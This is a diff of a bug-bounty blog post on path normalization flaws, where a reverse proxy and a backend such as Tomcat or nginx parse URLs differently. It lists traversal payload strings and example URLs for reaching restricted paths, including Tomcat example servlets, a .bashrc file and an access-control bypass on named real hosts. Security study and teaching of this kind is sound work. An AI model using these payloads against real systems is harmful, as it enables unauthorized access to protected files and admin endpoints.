@@ -9,111 +9,143 @@ tags: [web,bugbounty]
 ---
 
 
-## Understanding and Exploiting Path Normalization Vulnerabilities
+# Path Normalization Vulnerability
 
-Path normalization vulnerabilities arise from inconsistencies between how a reverse proxy and a web application server (WAS) process and interpret URL paths. These vulnerabilities often occur due to misconfigurations or differences in path handling mechanisms. This blog explores the mechanics behind path normalization issues and provides practical tips for identifying and exploiting them.
+## Overview
+The path normalization vulnerability arises from a misconfiguration between the reverse proxy and the Web Application Server (WAS). This vulnerability occurs when an incorrect path in the proxy settings, such as those set by nginx, leads to unintended behavior. For instance, an attacker might insert the string `..;/` into a URL path. If passed to Tomcat, it interprets `..;/` as `../`, allowing the attacker to access directories outside the intended path.
 
----
+### Example:
+Traversing back multiple directories to observe the responses can reveal vulnerabilities. For a particular host, traversing back three directories resulted in a `400 Bad Request`, indicating the traversal went too far down the internal web root.
 
-### What is Path Normalization?
-
-Path normalization is the process of converting URL paths into a standardized format. This process often involves resolving relative paths like `..` (which represents the parent directory) into absolute paths. When an application or a server encounters a path traversal attack, it may incorrectly normalize the path, leading to unauthorized access or other security issues.
-
-A classic example of path normalization vulnerability involves an attacker manipulating the URL path to access resources that should be restricted. For instance, if an attacker sends a path with `..;/`, a server might normalize it to `../`, potentially bypassing access controls.
-
----
-
-### Case Study: Exploiting Path Normalization Vulnerabilities
-
-#### 1. Initial Exploration and Reconnaissance
-
-Start by traversing directories and observing responses. For example, if navigating back three directories results in a `400 Bad Request`, it indicates that the traversal is likely too deep. Conversely, a `404 Not Found` might suggest that you’ve hit a valid path but it might not be accessible.
-
-```plaintext
-Example URL traversal:
-https://example.com/de/..;/..;/..;/..;/
-```
-
-Here, you might receive:
-- `400 Bad Request` (indicating excessive traversal)
-- `404 Not Found` (indicating a potential valid path that does not exist)
-
-#### 2. URL Encoding and Responses
-
-Some servers handle URL encoding differently. For example, Apache’s default configuration has `AllowEncodedSlashes` turned off, which means encoded slashes (`%2f`) might not be processed correctly. On the other hand, if a server does not decode these encodings before processing, it might expose sensitive paths.
-
-```plaintext
-/admin/path/test.html         403 Forbidden
-/admin/path/for/../test.html  200 OK
-```
-
-#### 3. Practical Exploits
-
-Here are some examples where path normalization can be exploited:
-
-- **NGINX REST API Access**
-
-  An attacker might exploit path normalization to gain unauthorized access to NGINX’s REST API endpoints.
-
-  ```plaintext
-  https://example.com/path/..;/api/9/nginx
+- Example URL:
+  ```
+  example.com/de/..;/..;/..;/
   ```
 
-- **Tomcat Path Traversal**
+Forward traversal resulted in a `404` page.
 
-  Apache Tomcat might be vulnerable if it handles paths differently than the reverse proxy. For instance, `../examples/servlets/SessionExample` could expose example servlets that should not be accessible.
-
-  ```plaintext
-  https://example.com/..;/examples/servlets/servlet/SessionExample
+- Example URL:
+  ```
+  https://www.example.com/de/..;/..;/FUZZ
   ```
 
-#### 4. Advanced Techniques
+## Tips & Techniques
 
-Sometimes, path normalization issues are more subtle. For instance, mismatches between Cloudflare’s CDN caching and the backend server’s path routing might expose sensitive data:
+### 1. Identifying Root Traversal
+When it's challenging to leak the backend URL, a `400 HTTP Status` code can indicate that traversal has passed the root directory.
 
-```plaintext
-https://example.com/share/%2F..%2F/api/auth/session
+- Example:
+  ```
+  host[.]com/test/../../ = 400
+  ```
+
+### 2. Path Manipulation
+Attempts to access sensitive directories may bypass restrictions:
+
+- Example:
+  ```
+  host.com/admin     403
+  host.com/%2e/admin 200
+  ```
+
+Browsing the contents of `/home/dist/.bashrc` could be achieved by manipulating paths:
+
+- Example:
+  ```
+  https://nodejs.org/metrics../.bashrc
+  ```
+
+Accessing protected resources:
+- Example:
+  ```
+  admin/path/test.html         403 
+  admin/path/for/../test.html  200 OK
+  ```
+
+### 3. Exploiting Misconfigurations
+Path normalization issues can be exploited to access unauthorized resources.
+
+- Test Case:
+  ```
+  https://exampledotcom/path/..;/api/9/nginx
+  ```
+
+### 4. Apache & Tomcat Considerations
+When dealing with Apache or Tomcat, specific configurations or default installations may introduce vulnerabilities:
+
+- Example:
+  ```
+  /..;/examples/servlets/servlet/SessionExample
+  ```
+
+Accessing a resource after normalization:
+- Example:
+  ```
+  https://odyssey-lift-off-rest-api.herokuapp.com/author/1/../../anotherresouce/2
+  ```
+
+### 5. Recon Tips
+- Start recon with Chrome DevTools, filtering for Fetch/XHR and Docs to reduce noise.
+- Use tools like `ffuf` to identify path traversal vulnerabilities with various payloads.
+
+## Common Payloads for Path Traversal:
+```text
+../
+..%2f
+..%252f
+%2e%2e%2f
+%252e%252e%252f
+..;a=a/
+..%01/
+..%0a/
+..%0b/;.css
+..//
+...//
+.../
+..;/
+..\
+...\
+..%5c
+..%255c
+..%255c\
+%2e%2e%5c
+%252e%252e%255c
+..\/
+../\
+./
+...
 ```
 
-The CDN might cache the request before URL decoding, exposing sensitive backend data.
+## Advanced Exploits
+### 1. Bypassing Access Control
+An advanced example of access control bypass using Apache colon path traversal:
+```text
+https://rampadmin.apple.com/admin/healthcheck/..;/data/existing_UAT_DS_App_Ids.json → 200 OK
+```
 
----
+### 2. CDN and Backend Normalization Differences
+An issue where Cloudflare’s CDN normalized the path differently than the backend server, leading to unintended access:
+```text
+/share/%2F..%2F/api/auth/session
+```
 
-### Reconnaissance Tips
+### 3. Nginx Off-by-Slash
+Nginx configuration mistakes can allow access to restricted files:
+```text
+http://127.0.0.1/static../settings.py
+```
 
-#### 1. Using Chrome DevTools
-
-Start your reconnaissance with Chrome DevTools by focusing on Fetch/XHR and Docs. This approach minimizes noise from static files and helps pinpoint valuable endpoints.
-
-#### 2. Running Brute Force Tools
-
-Use tools like `ffuf` to brute force potential paths. Common payloads include:
-
-```plaintext
+### 4. Recon Example
+Finding interesting API endpoints during recon with tools like `ffuf`:
+```text
 /experience/..;/
 /experience/../
 /experience/..%2f
 /experience/%2e%2e%2f
 ```
 
-Analyze responses for anomalies. For example, a `403 Forbidden` response might indicate restricted access, while a `404 Not Found` could hint at a deeper directory.
-
-#### 3. Leveraging Path Encodings
-
-Try various encodings to bypass filters. Some encodings to consider include:
-
-```plaintext
-..%2f
-..%252f
-%2e%2e%2f
-%252e%252e%252f
+## References:
+- [Breaking Parser Logic](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)
+- [Huntr Tutorial](https://huntr.com/get-started/tutorial)
+- [Avatao Module](https://next.avatao.com/modules/custom)
 ```
-
-Analyze how the server processes these encodings and look for inconsistencies.
-
----
-
-
-For more insights on path normalization and related vulnerabilities, check out these resources:
-- [SecJuice: Breaking Parser Logic](https://www.secjuice.com/breaking-parser-logic-gain-access-to-nginx-plus-api-read-write-upstreams/)
-- [BlackHat Presentation by Orange Tsai](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)
